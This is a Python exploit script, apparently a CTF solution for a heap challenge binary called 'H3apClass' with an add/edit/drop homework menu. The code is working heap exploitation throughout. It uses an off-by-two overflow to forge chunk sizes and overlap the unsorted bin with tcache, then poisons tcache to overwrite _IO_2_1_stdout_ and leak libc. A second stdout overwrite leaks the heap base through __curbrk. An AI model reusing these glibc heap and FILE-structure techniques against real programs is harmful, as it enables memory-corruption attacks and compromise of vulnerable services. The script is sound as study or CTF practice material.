# from LibcSearcher import *
from helper import *
from pwncli import *
import ctypes as c
from exp import ret2libc_A, ret2libc_B
from helper import heap
from pwncli import p16_ex
loader = Loader("target/H3apClass", 64, debug=True)
# loader.patch_AIO(2.27)
elf,libc = loader.init()
io = loader.process()
# io = loader.ida()
abbre(globals(), io, loader) # 此处定义了常用的缩写
menu(globals())
loader.get_addrs()


def add(idx, size, data=b"deadbeef"):
    sla(b'4:Drop homework\n', b"1")
    sla(b"Which homework?\n", bt(idx))
    sla(b"size:\n", bt(size))
    sa(b"content:\n", data)

def edit(idx, data):
    sla(b"4:Drop homework\n", b"3")
    sla(b"Which homework?\n", bt(idx))
    sa(b"content:\n", data)


def dele(idx):
    sla(b"4:Drop homework\n", b"4")
    sla(b"Which homework?\n", bt(idx))

# 0x557BD192F040 // heap_list
# 0x557BD192F0E0 // size_list
success_hex(loader.section['.bss'], "[local]..bss")
success_hex(loader.maps['libc'], "[local]..libc")


size = 0xe8
add(0, 0x18, b"a"*0x18)
add(1, 0xf8)    # a (size = 0x101) off by two
add(2, size)    # b
add(3, size)    # c
add(4, size)    # d
add(5, size)    # e, 4 * 0xf0 == 0x3c0
                # 0x3c0 + 0x100 > 0x408 (ub)
add(6, 0x18, b"padding")

# ===ub overlap with tb===
edit(0, 0x18*b"a" + p16(0x4c1))
dele(5);dele(4);dele(3);dele(2);dele(1)
# tb 0xa0:    |b|c|d|e|
# ub 0x380: |a        |

add(1, 0xf8, b"dui'qi.") # 对齐
# tb 0xa0:         |b |c |d |e |
# ub 0x280:    |1  |           |
payload = p16(0xffff & (loader.maps['libc'] + libc.sym['_IO_2_1_stdout_']))
add(2, 0x78, payload) # modify fd
# tb 0xa0:        |b  |->[_IO_2_1]
# ub 0x280:   | 1 |2 |             |

add(3, size) # consume `b`
add(4, size, flat([     # modify _IO_2_1
    0xfffffbad1887, 0, 0, 0, b"\x00"
]))

libc_base = uu64(ru(b"\x7f")[-6:]) - 0x1eb980
libc.address = libc_base
success(f"libc: {hex(libc_base)}")

pause("after get libc")
#                 |3  |
# ub 0x280:   | 1 |2 |             |
success_hex(loader.section['.bss'], "[local]..bss")
success_hex(loader.maps['libc'], "[local]..libc")
pause()
dele(3)
# tb 0xa0:        |x  |
# ub 0x280:   | 1 |2 |             |


pause("before edit 2")
edit(2, p64(libc.sym['_IO_2_1_stdout_'])[:6])
pause("before add 3")
add(3, size)
add(5, size, flat([
    0xfbad1887, 0, 0, 0, libc.sym['__curbrk']-8,libc.sym['__curbrk']+8
]))

m = r(16)
heap_base = u64(m[8:]) - 0x21000
info_hex(heap_base,"heap base")
